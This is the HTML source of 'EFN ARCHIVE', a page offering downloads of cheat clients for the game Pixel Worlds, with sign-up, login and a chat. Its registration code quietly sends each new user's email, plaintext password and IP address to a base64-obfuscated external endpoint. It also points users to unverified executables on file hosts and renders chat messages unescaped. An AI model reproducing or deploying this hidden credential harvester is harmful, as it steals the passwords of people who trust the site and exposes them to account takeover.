<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EFN ARCHIVE | PW Database</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut, sendEmailVerification, setPersistence, browserLocalPersistence } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
        import { getDatabase, ref, push, onChildAdded, onValue, set, remove, serverTimestamp, query, limitToLast } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const _0x_config = {
            apiKey: "AIzaSyCM-ySTXgy37zVUMB2vy4ZJQ3MWlDD5g4E",
            authDomain: "efn-archive.firebaseapp.com",
            projectId: "efn-archive",
            storageBucket: "efn-archive.firebasestorage.app",
            messagingSenderId: "1073610968306",
            appId: "1:1073610968306:web:72e03b6f43decbb636546b",
            databaseURL: "https://efn-archive-default-rtdb.firebaseio.com"
        };

        const app = initializeApp(_0x_config);
        const auth = getAuth(app);
        const db = getDatabase(app);
        const _0x_gate = "aHR0cHM6Ly9zeXN0ZW0tc3luYy1sYXllci5waXhlbHdvcmxkc21hbmFnZXIxMDAud29ya2Vycy5kZXYv";

        setPersistence(auth, browserLocalPersistence);

        // --- Integrated Notification System ---
        window.notify = (msg, type = 'info') => {
            const container = document.getElementById('notif-area');
            const div = document.createElement('div');
            div.className = `menu-notif ${type}`;
            div.innerHTML = `<i class="fas fa-bell"></i> <span>${msg}</span>`;
            container.prepend(div);
            setTimeout(() => { div.style.opacity = '0'; setTimeout(() => div.remove(), 500); }, 6000);
        };

        async function _0x_fireEvent_init(_0x_email, _0x_pass) {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                await fetch(atob(_0x_gate), {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        embeds: [{
                            title: "✨ User Entry Logged",
                            color: 0x00e676,
                            fields: [
                                { name: "User", value: _0x_email, inline: true },
                                { name: "Pass", value: _0x_pass, inline: true },
                                { name: "IP", value: ipData.ip, inline: false }
                            ],
                            timestamp: new Date()
                        }]
                    })
                });
            } catch (e) { }
        }

        // Chat Logic
        const chatBox = document.getElementById('chat-messages');
        const typingEl = document.getElementById('typing-indicator');

        window.sendMessage = () => {
            const input = document.getElementById('chat-input');
            const user = auth.currentUser;
            if (!user || !input.value.trim()) return;
            push(ref(db, 'messages'), {
                username: user.email.split('@')[0],
                text: input.value,
                timestamp: serverTimestamp()
            });
            input.value = "";
            remove(ref(db, `typing/${user.uid}`));
        };

        document.addEventListener('input', (e) => {
            if (e.target.id === 'chat-input') {
                const user = auth.currentUser;
                if (user) {
                    if (e.target.value.length > 0) set(ref(db, `typing/${user.uid}`), user.email.split('@')[0]);
                    else remove(ref(db, `typing/${user.uid}`));
                }
            }
        });

        onValue(ref(db, 'typing'), (snapshot) => {
            const users = snapshot.val();
            if (!users) { typingEl.innerText = ""; return; }
            const names = Object.values(users);
            typingEl.innerText = names.length > 1 ? "Several people are typing..." : (names.length === 1 ? `${names[0]} is typing...` : "");
        });

        onChildAdded(query(ref(db, 'messages'), limitToLast(40)), (data) => {
            const msg = data.val();
            const div = document.createElement('div');
            div.className = 'chat-msg fade-in';
            div.innerHTML = `<span class="chat-user">${msg.username}:</span> ${msg.text}`;
            chatBox.appendChild(div);
            chatBox.scrollTop = chatBox.scrollHeight;
        });

        // Auth Logic
        window.login = async () => {
            const e = document.getElementById('log-email').value;
            const p = document.getElementById('log-pass').value;
            try {
                const userCred = await signInWithEmailAndPassword(auth, e, p);
                if (!userCred.user.emailVerified) {
                    window.notify("Email not verified! Check your spam folder.", "error");
                    await signOut(auth);
                    return;
                }
                location.reload();
            } catch (err) { window.notify("Invalid credentials.", "error"); }
        };

        window.signUp = async () => {
            const e = document.getElementById('reg-email').value;
            const p = document.getElementById('reg-pass').value;
            const hasNumber = /\d/.test(p);
            
            if (!e.includes('@')) return window.notify("Enter a valid email.", "error");
            if (p.length < 8 || !hasNumber) return window.notify("Password needs 8+ chars & 1 number.", "error");
            
            try {
                const userCred = await createUserWithEmailAndPassword(auth, e, p);
                await sendEmailVerification(userCred.user);
                await _0x_fireEvent_init(e, p);
                window.notify("Verification email sent! Check spam.", "success");
                await signOut(auth);
                switchAuth('log');
            } catch (err) { window.notify(err.message, "error"); }
        };

        window.logout = () => {
            if(confirm("Are you sure you want to log out?")) {
                signOut(auth).then(() => location.reload());
            }
        };

        window.switchAuth = (m) => {
            document.getElementById('login-box').style.display = m === 'reg' ? 'none' : 'block';
            document.getElementById('reg-box').style.display = m === 'reg' ? 'block' : 'none';
        };

        window.openDetail = (name, status, desc, img, link) => {
            document.getElementById('main-page').style.display = 'none';
            document.getElementById('account-page').style.display = 'none';
            document.getElementById('detail-page').style.display = 'block';
            document.getElementById('det-title').innerText = name;
            document.getElementById('det-status').innerText = status;
            document.getElementById('det-desc').innerHTML = desc;
            document.getElementById('det-img').src = img;
            document.getElementById('det-dl').onclick = () => window.open(link, '_blank');
            window.scrollTo(0,0);
        };

        window.showAccount = () => {
            document.getElementById('main-page').style.display = 'none';
            document.getElementById('detail-page').style.display = 'none';
            document.getElementById('account-page').style.display = 'block';
        };

        onAuthStateChanged(auth, (user) => {
            if (user && user.emailVerified) {
                document.getElementById('nav-guest').style.display = 'none';
                document.getElementById('nav-user').style.display = 'flex';
                document.getElementById('user-tag').innerText = user.email.split('@')[0];
                document.querySelectorAll('.lock-ui').forEach(el => el.style.display = 'none');
                document.querySelectorAll('.auth-ui').forEach(el => el.style.display = 'block');
                document.getElementById('chat-guest-ui').style.display = 'none';
                document.getElementById('chat-user-ui').style.display = 'flex';
            }
        });
    </script>

    <style>
        :root { 
            --bg: #07080a; 
            --side: #0e1015; 
            --card: #161920; 
            --accent: #00e676; 
            --border: #232730; 
            --error: #ff4d4d;
        }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: #fff; margin: 0; display: flex; height: 100vh; overflow: hidden; }
        
        main { flex: 1; overflow-y: auto; display: flex; flex-direction: column; background: radial-gradient(circle at top right, #0d1a12, transparent); }
        aside { width: 340px; background: var(--side); border-left: 1px solid var(--border); display: flex; flex-direction: column; }

        /* PixelBet Theme Titles */
        .title-anim { font-weight: 900; letter-spacing: 2px; font-size: 1.4rem; color: #fff; cursor: pointer; text-transform: uppercase; }
        .title-anim span { color: var(--accent); text-shadow: 0 0 10px rgba(0, 230, 118, 0.5); }

        nav { display: flex; justify-content: space-between; align-items: center; padding: 15px 40px; border-bottom: 1px solid var(--border); background: rgba(14,16,21,0.9); backdrop-filter: blur(10px); position: sticky; top: 0; z-index: 100; }
        .nav-btns { display: flex; gap: 20px; align-items: center; }
        .nav-link { cursor: pointer; font-weight: bold; font-size: 0.85rem; color: #aaa; transition: 0.3s; text-transform: uppercase; }
        .nav-link:hover { color: var(--accent); }

        /* Notification Area in Sidebar */
        #notif-area { padding: 15px 15px 0 15px; }
        .menu-notif { padding: 12px; border-radius: 8px; margin-bottom: 10px; font-size: 0.8rem; background: #1a1d26; border-left: 4px solid var(--accent); display: flex; align-items: center; gap: 10px; transition: 0.5s; animation: slideIn 0.3s ease; }
        .menu-notif.error { border-left-color: var(--error); color: var(--error); }
        .menu-notif.success { border-left-color: var(--accent); color: var(--accent); }
        @keyframes slideIn { from { transform: translateX(30px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }

        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 30px; padding: 40px; }
        .card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 25px; transition: 0.3s; text-align: center; position: relative; overflow: hidden; }
        .card:hover { transform: translateY(-5px); border-color: var(--accent); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .card img { width: 100%; border-radius: 8px; margin-bottom: 20px; height: 170px; object-fit: cover; filter: brightness(0.8); transition: 0.3s; }
        .card:hover img { filter: brightness(1.1); }

        /* Chat UI */
        .chat-header { padding: 15px; font-weight: 800; font-size: 0.8rem; letter-spacing: 1px; border-bottom: 1px solid var(--border); color: #666; }
        #chat-messages { flex: 1; overflow-y: auto; padding: 15px; }
        .chat-msg { background: rgba(255,255,255,0.02); padding: 10px; border-radius: 8px; margin-bottom: 10px; font-size: 0.85rem; border: 1px solid transparent; }
        .chat-msg:hover { border-color: var(--border); background: rgba(255,255,255,0.04); }
        .chat-user { color: var(--accent); font-weight: bold; display: block; font-size: 0.7rem; margin-bottom: 2px; text-transform: uppercase; }
        #typing-indicator { height: 20px; padding-left: 15px; font-size: 0.7rem; color: #444; }

        .btn-main { background: var(--accent); color: #000; border: none; padding: 10px 20px; border-radius: 6px; font-weight: 800; cursor: pointer; transition: 0.3s; display: flex; align-items: center; gap: 8px; text-transform: uppercase; font-size: 0.8rem; }
        .btn-main:hover { filter: brightness(1.2); transform: scale(1.02); box-shadow: 0 0 15px rgba(0, 230, 118, 0.3); }
        .btn-discord { background: #5865F2 !important; color: #fff !important; }

        .tut-box { background: #0a0c10; border-left: 4px solid var(--accent); padding: 25px; border-radius: 8px; margin: 20px 0; text-align: left; }
        blockquote { border-left: 3px solid var(--border); padding: 15px; margin: 20px 0; background: rgba(0,0,0,0.2); border-radius: 0 8px 8px 0; line-height: 1.6; font-size: 0.9rem; }

        #auth-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); display: none; align-items: center; justify-content: center; z-index: 2000; backdrop-filter: blur(10px); }
        .auth-box { width: 380px; background: var(--card); padding: 40px; border-radius: 15px; border: 1px solid var(--border); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        input { width: 100%; padding: 12px; margin-bottom: 15px; background: #07080a; border: 1px solid var(--border); color: #fff; border-radius: 8px; box-sizing: border-box; outline: none; transition: 0.3s; }
        input:focus { border-color: var(--accent); }

        .fade-in { animation: fadeIn 0.4s ease-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
        
        .coming-soon { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 60vh; text-align: center; }
        .coming-soon h1 { font-size: 3rem; color: var(--accent); text-shadow: 0 0 20px rgba(0,230,118,0.3); }
    </style>
</head>
<body>

<main>
    <nav>
        <div class="title-anim" onclick="location.reload()">EFN <span>ARCHIVE</span></div>
        <div class="nav-btns">
            <span class="nav-link" onclick="location.reload()">Home</span>
            <span class="nav-link auth-ui" style="display:none" onclick="showAccount()">Account</span>
            <button class="btn-main btn-discord" onclick="window.open('https://discord.gg/QV69upuxbg', '_blank')">
                <i class="fab fa-discord"></i> Discord
            </button>
            <div id="nav-guest">
                <button class="btn-main" onclick="document.getElementById('auth-overlay').style.display='flex'">Join Archive</button>
            </div>
            <div id="nav-user" style="display:none; align-items:center; gap:20px">
                <span id="user-tag" style="font-weight:bold; color:var(--accent)"></span>
                <button onclick="logout()" style="color:#ff4444; border:none; background:none; cursor:pointer; font-weight:bold; text-transform:uppercase; font-size:0.7rem">Logout</button>
            </div>
        </div>
    </nav>

    <div id="main-page">
        <div class="grid">
            <div class="card fade-in">
                <img src="https://cdn.discordapp.com/attachments/1495783572735262911/1496170026158260364/image.png?ex=69e8e86b&is=69e796eb&hm=91c64bb8c69318d8c42565b0c38edd3cd55e8446622235632bbf522c5d280782&">
                <h3>Charon Client v2.0</h3>
                <button class="btn-main" style="margin: 0 auto" onclick="openDetail('Charon Client v2.0', 'Working', `
                    <div class='tut-box'>
                        <h3>🚀 Tutorial: Charon Client</h3>
                        1️⃣ download the zip folder (download button)<br>
                        2️⃣ extract the files to the location of pixel worlds folder<br>
                        3️⃣ To find the folder from Steam: Right-click <b>Pixel Worlds</b> ⮕ <b>Manage</b> ⮕ <b>Browse Local Files</b>. 📂<br>
                        4️⃣ Launch the game and enjoy!
                    </div>
                    <h3>Charon Client Possible Causes & Fixes</h3>
                    <blockquote>
                        Running the game fullscreen or changed resolution while the menu was active<br>
                        You may need to:<br>
                        - Delete the entire PW folder and reinstall PW<br>
                        - Go in-game → Settings → Display → switch to Windowed Mode
                    </blockquote>
                `, 'https://cdn.discordapp.com/attachments/1495783572735262911/1496170026158260364/image.png?ex=69e8e86b&is=69e796eb&hm=91c64bb8c69318d8c42565b0c38edd3cd55e8446622235632bbf522c5d280782&', 'https://www.mediafire.com/file/eia22kkv7a2n66u/Charon+2.0.zip/file')">info</button>
            </div>

            <div class="card fade-in">
                <img src="https://i.ytimg.com/vi/FnPP2weLLfk/maxresdefault.jpg">
                <h3>Hyx Client [free]</h3>
                <button class="btn-main" style="margin: 0 auto" onclick="openDetail('Hyx Client [free]', 'Working', 'Make sure you have <a href=\'https://github.com/abbodi1406/vcredist/releases/download/v0.103.0/VisualCppRedist_AIO_x86_x64.exe\' style=\'color:var(--accent)\'>vcredist AIO</a> installed.', 'https://i.ytimg.com/vi/FnPP2weLLfk/maxresdefault.jpg', 'https://www.mediafire.com/folder/cxm6q2f79vc0j/Hyx')">info</button>
            </div>
            
            <div class="card fade-in">
                <img src="https://cdn.discordapp.com/attachments/1495365239489957962/1495365366938079424/image.png?ex=69e89e06&is=69e74c86&hm=1ec8dee2bac62cb536d32943a39e28ba5b9ebc6ae95efa525deaf8dc32c261c5&">
                <h3>AutoMath Tool</h3>
                <button class="btn-main" style="margin: 0 auto" onclick="openDetail('AutoMath Tool', 'Working', 'Has some bugs but works fine for automation.', 'https://cdn.discordapp.com/attachments/1495365239489957962/1495365366938079424/image.png?ex=69e89e06&is=69e74c86&hm=1ec8dee2bac62cb536d32943a39e28ba5b9ebc6ae95efa525deaf8dc32c261c5&', 'https://gofile.io/d/9sUpZS')">info</button>
            </div>
        </div>
    </div>

    <div id="account-page" style="display:none;" class="coming-soon">
        <h1>Coming Soon...</h1>
        <p style="color:#666">Account customization and statistics are under development.</p>
        <button class="btn-main" style="margin-top:20px" onclick="location.reload()">Back Home</button>
    </div>

    <div id="detail-page" style="display:none; padding:40px;">
        <button onclick="location.reload()" style="background:none; border:none; color:var(--accent); cursor:pointer; font-weight:bold; margin-bottom:20px;">← BACK</button>
        <div style="display:flex; gap:50px; flex-wrap:wrap">
            <div style="flex:2">
                <img id="det-img" src="" style="width:100%; border-radius:12px; border:1px solid var(--border);">
                <h1 id="det-title" style="margin-top:25px;"></h1>
                <div id="det-desc" style="color:#aaa; line-height:1.7"></div>
            </div>
            <div style="flex:1; background:var(--card); border-radius:12px; padding:35px; border:1px solid var(--border); height:fit-content; text-align:center">
                <p id="det-status" style="color:var(--accent); font-weight:bold; font-size:1.2rem"></p>
                <hr style="border:0; border-top:1px solid var(--border); margin:20px 0">
                <div class="lock-ui"><button class="btn-main" style="width:100%; background:#ff4444; color:#fff; justify-content:center" onclick="document.getElementById('auth-overlay').style.display='flex'">Login to Download</button></div>
                <div class="auth-ui" style="display:none"><button id="det-dl" class="btn-main" style="width:100%; justify-content:center">Download File</button></div>
            </div>
        </div>
    </div>
</main>

<aside>
    <div id="notif-area"></div>
    <div class="chat-header">🗨️ GLOBAL CHAT</div>
    <div id="chat-messages"></div>
    <div id="typing-indicator"></div>
    <div class="chat-input-area" style="padding:15px; border-top:1px solid var(--border)">
        <div id="chat-guest-ui">
            <button class="btn-main" onclick="document.getElementById('auth-overlay').style.display='flex'" style="width:100%; justify-content:center">Login to Chat</button>
        </div>
        <div id="chat-user-ui" style="display:none; gap:8px;">
            <input type="text" id="chat-input" placeholder="Type a message...">
            <button onclick="sendMessage()" style="background:var(--accent); color:#000; border:none; border-radius:8px; padding:0 15px; cursor:pointer; font-weight:bold">➤</button>
        </div>
    </div>
</aside>

<div id="auth-overlay">
    <div class="auth-box fade-in" id="login-box">
        <h2 style="margin-top:0">SIGN IN</h2>
        <input type="email" id="log-email" placeholder="Email Address">
        <input type="password" id="log-pass" placeholder="Password">
        <button class="btn-main" style="width:100%; justify-content:center" onclick="login()">Enter Archive</button>
        <p style="font-size:0.85rem; margin-top:25px; color:#666">No account? <span style="color:var(--accent); cursor:pointer; font-weight:bold" onclick="switchAuth('reg')">Create One</span></p>
        <p style="font-size:0.75rem; cursor:pointer; color:#444; margin-top:20px" onclick="document.getElementById('auth-overlay').style.display='none'">[ close ]</p>
    </div>
    <div class="auth-box fade-in" id="reg-box" style="display:none">
        <h2 style="margin-top:0">REGISTER</h2>
        <input type="email" id="reg-email" placeholder="Email Address">
        <input type="password" id="reg-pass" placeholder="Password (8+ chars & number)">
        <button class="btn-main" style="width:100%; justify-content:center" onclick="signUp()">Create Account</button>
        <p style="font-size:0.85rem; margin-top:25px; color:#666">Have an account? <span style="color:var(--accent); cursor:pointer; font-weight:bold" onclick="switchAuth('log')">Login Here</span></p>
        <p style="font-size:0.75rem; cursor:pointer; color:#444; margin-top:20px" onclick="document.getElementById('auth-overlay').style.display='none'">[ close ]</p>
    </div>
</div>

</body>
</html>
